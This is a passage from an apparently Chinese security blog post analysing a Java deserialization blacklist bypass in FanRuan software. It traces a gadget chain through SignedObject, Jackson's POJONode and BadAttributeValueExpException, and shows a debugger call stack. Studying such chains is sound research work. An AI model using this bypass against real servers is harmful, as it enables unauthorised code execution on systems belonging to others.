<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306153023320.png" alt="image-20240306153023320"></th>
</tr>
</thead>
</table>
<h3 id="二次反序列化绕过限制"><a href="#二次反序列化绕过限制" class="headerlink" title="二次反序列化绕过限制"></a>二次反序列化绕过限制</h3><p>通过<code>blacklist.txt</code>黑名单可以看到，常规利用链都已经在黑名单中，那么真的就没有办法进行利用了吗？根据师傅们的高见，得知可以利用<code>SignedObject</code> 类进行反序列化绕过黑名单中的类名再次反序列化进行利用，俗称二次反序列化。</p>
<p>在<code>java.security.SignedObject</code>类中存在一个<code>getObject</code>方法，这个方法会<code>this.content</code>变量进行反序列化。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305193604665.png" alt="image-20240305193604665"></th>
</tr>
</thead>
</table>
<p>而<code>SignedObject</code>类的构造方法会将传入的<code>object</code>对象进行序列化，并赋值给<code>this.content</code>变量。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305193810518.png" alt="image-20240305193810518"></th>
</tr>
</thead>
</table>
<p>那么通过<code>SignedObject</code>这个类，可以将某个利用链，如CB链触发点<code>PriorityQueue</code>对象，作为参数传递进去，再找到一条路径调用<code>getObject</code>方法，便可以实现二次反序列化。</p>
<p><code>getObject</code>属于<code>getter</code>方法，在<code>fastjson</code>中，对一个类进行序列化会自动调用该类的<code>静态代码块</code>、<code>构造方法</code>、<code>getter</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306145026712.png" alt="image-20240306145026712"></th>
</tr>
</thead>
</table>
<p>但是在帆软环境中是没有<code>fastjson</code>依赖的，帆软中对<code>json</code>的处理是使用的<code>jackson</code>；在<code>jackson</code>中序列化一个类也有着类似的效果。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306145745047.png" alt="image-20240306145745047"></th>
</tr>
</thead>
</table>
<p>在<code>com.fr.third.fasterxml.jackson.databind.node.InternalNodeMapper</code>类中，<code>nodeToString</code>方法和<code>nodeToPrettyString</code>方法都调用了<code>writeValueAsString</code>对<code>JsonNode</code>进行序列化。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306150412698.png" alt="image-20240306150412698"></th>
</tr>
</thead>
</table>
<p>而在<code>com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode</code>的<code>toString</code>和<code>toPrettyString</code>方法中也对如上两个方法分别进行调用；<code>this</code>代表所传入进行序列化的对象是当前调用的对象，当<code>BaseJsonNode</code>对象和继承了<code>BaseJsonNode</code>的对象调用到<code>toString</code>方法，就会调用<code>InternalNodeMapper.nodeToPrettyString(this)</code>对当前调用的对象进行序列化，自动调用<code>getter</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306150913308.png" alt="image-20240306150913308"></th>
</tr>
</thead>
</table>
<p><code>BaseJsonNode</code>类被18个子类继承。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306151118680.png" alt="image-20240306151118680"></th>
</tr>
</thead>
</table>
<p>在这个18个子类中，只有<code>POJONode</code>类的构造方法能传入<code>Object</code>对象。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306152141790.png" alt="image-20240306152141790"></th>
</tr>
</thead>
</table>
<p>这里，我们将<code>SignedObject</code>对象作为参数，创建一个<code>POJONode</code>对象，并调用其<code>toString</code>方法，并在<code>SignedObject</code>的<code>getObject</code>中打上断点，运行便调用到了该方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306152714272.png" alt="image-20240306152714272"></th>
</tr>
</thead>
</table>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306152600445.png" alt="image-20240306152600445"></th>
</tr>
</thead>
</table>
<p>调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getObject:<span class="number">177</span>, SignedObject (java.security)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">690</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">755</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1119</span>, SerializerProvider (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fr.third.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">481</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">320</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1517</span>, ObjectWriter$Prefetch (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1218</span>, ObjectWriter (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1087</span>, ObjectWriter (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fr.third.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fr.third.fasterxml.jackson.databind.node)</span><br><span class="line">main:<span class="number">84</span>, Test (example)</span><br></pre></td></tr></table></figure>

<p>将<code>SignedObject</code>封装在<code>POJONode</code>类中，调用其<code>toString</code>方法，便触发了<code>SignedObject</code>的<code>getObject</code>方法。为了在执行反序列化<code>readObject</code>中调用到<code>POJONode</code>的<code>toString</code>方法，接下来还需要找到一条直接或间接的点能够触发<code>POJONode</code>的<code>toString</code>方法的点。</p>
<p>在<code>javax.management.BadAttributeValueExpException</code>的<code>readObject</code>方法中，调用了<code>toString</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306154100936.png" alt="image-20240306154100936"></th>
</tr>
</thead>
</table>
<p>并且<code>this.val</code>可通过构造方法进行传递。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306154148015.png" alt="image-20240306154148015"></th>
</tr>
</thead>
</table>
<p>将<code>POJONode</code>对象封装在<code>BadAttributeValueExpException</code>中，可直接进行触发。</p>
<table>
<thead>
<tr>
